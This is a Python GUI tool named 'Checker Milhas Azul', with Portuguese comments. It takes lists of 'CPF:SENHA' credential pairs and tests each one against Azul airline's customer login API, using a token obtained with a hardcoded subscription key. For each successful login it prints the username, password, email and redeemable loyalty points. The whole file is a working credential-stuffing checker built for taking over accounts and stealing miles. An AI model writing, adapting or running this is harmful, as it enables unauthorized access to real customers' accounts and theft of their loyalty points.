import os
import requests
import json
import time
import threading
import tkinter as tk
from tkinter import messagebox, scrolledtext
from colorama import init, Fore, Style

# Inicializa o Colorama
init(autoreset=True)

# Novo design ASCII mais elegante com versão
ASCII_ART = rf"""{Fore.BLUE}
░█▀▀░░░█░█░░░█░█░░░░░░░█▀█░░░▀▀█░░░█░█░░░█░░
░█░░░░░█▀█░░░█▀▄░░░░░░░█▀█░░░▄▀░░░░█░█░░░█░░
░▀▀▀░░░▀░▀░░░▀░▀░░░░░░░▀░▀░░░▀▀▀░░░▀▀▀░░░▀▀▀
                                                                              
{Style.RESET_ALL}
"""

VERSION = "3.0"
BUILD = "20241110"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_token():
    url = "https://b2c-api.voeazul.com.br/authentication/api/authentication/v1/token"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Length": "0",
        "Culture": "pt-BR",
        "Device": "novosite",
        "Ocp-Apim-Subscription-Key": "0fc6ff296ef2431bb106504c92dd227c",
        "Origin": "https://www.voeazul.com.br",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    }
    payload = {
        "data": "",
        "notifications": []
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        response.raise_for_status()
        data = response.json()
        token = data.get('data', None)
        if token:
            return token
        else:
            raise Exception("Token não encontrado na resposta.")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Erro na requisição: {e}{Style.RESET_ALL}")
        return None        

def authenticate_user(username, password, token):
    data = {
        "userName": username,
        "password": password 
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        "Authorization": f"Bearer {token}",
    }

    try:
        response = requests.post('https://b2c-api.voeazul.com.br/sales/b2c/customer/api/v1/customers/login', headers=headers, json=data)
        response.raise_for_status()
        response_data = response.json()
        email = response_data['data']['email']
        pontos = response_data['data']['programInfo']['redeemable']['points']
        result = f"✅️ LOGIN AUTENTICADO: {username}:{password} | {email} | Pontos: {pontos}"
        return result
    except requests.exceptions.RequestException:
        return f"❌️ ACESSO NEGADO: {username}:{password} | ⚠️ SENHA INCORRETA OU CADASTRO INEXISTENTE"

def process_credentials():
    token = get_token()
    if not token:
        messagebox.showerror("Erro", "Falha ao obter o token.")
        return

    credentials = entry_credentials.get("1.0", tk.END).strip().splitlines()
    results = []

    for cred in credentials:
        if ':' in cred:
            username, password = cred.split(':')
            result = authenticate_user(username.strip(), password.strip(), token)
            results.append(result)
            time.sleep(1)  # Simula um pequeno atraso para não sobrecarregar o servidor
        else:
            results.append("⚠️ Formato inválido. Use 'CPF:SENHA'.")

    # Exibir resultados no campo de texto
    results_text.config(state=tk.NORMAL)
    results_text.delete(1.0, tk.END)  # Limpa resultados anteriores
    results_text.insert(tk.END, "\n".join(results))
    results_text.config(state=tk.DISABLED)

def create_main_window():
    window = tk.Tk()
    window.title("Checker Milhas Azul")
    window.geometry("600x400")

    # Adicionando título
    title_label = tk.Label(window, text="✈️ CHECKER MILHAS AZUL", font=("Arial", 16))
    title_label.pack(pady=10)

    # Campo de entrada para credenciais
    global entry_credentials
    entry_credentials = scrolledtext.ScrolledText(window, width=70, height=10)
    entry_credentials.pack(pady=10)
    entry_credentials.insert(tk.END, "Digite suas credenciais no formato 'CPF:SENHA' aqui...\n")

    # Botão para iniciar a verificação
    check_button = tk.Button(window, text="Verificar Milhas", command=process_credentials)
    check_button.pack(pady=10)

    # Campo de texto para exibir resultados
    global results_text
    results_text = scrolledtext.ScrolledText(window, width=70, height=10, state=tk.DISABLED)
    results_text.pack(pady=10)

    window.mainloop()

# Iniciar o programa
if __name__ == "__main__":
    create_main_window()
